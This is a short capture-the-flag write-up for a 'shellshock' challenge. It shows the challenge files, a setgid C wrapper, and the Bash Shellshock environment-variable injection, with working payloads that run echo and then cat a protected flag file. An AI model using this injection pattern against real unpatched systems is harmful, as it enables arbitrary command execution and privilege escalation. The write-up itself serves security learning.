We are given 4 files:
```bash
shellshock@pwnable:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

Interesting... We are given a bash file which if we execute seems to act like regular bash.

Let's examine `shellshock.c` (Which at that point i already thought about the well-known vulnerabillity in bash which is ironically named 'shellshock')

```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

Well, this is not really interesting but we can try to exploit this bash version using the environment variable manipulation of 'shellshock' CVE.

The problem in bash back then was about bash incorrectly executing commands that were put after an imported function set in an environment variable, for example:

`env_var='() { :; }; echo hey' ./shellshock`

```bash
shellshock@pwnable:~$ env_var='() { :;}; echo hey' ./shellshock
hey
/home/shellshock/bash: warning: setlocale: LC_ALL: cannot change locale (en_IN.UTF-8)
shock_me
```

Would actually execute our inserted `echo` before the command instructed to execute in the program's bash call.

Meaning we can `cat` the flag.

`env_var='() { :; }; cat flag' ./shellshock`




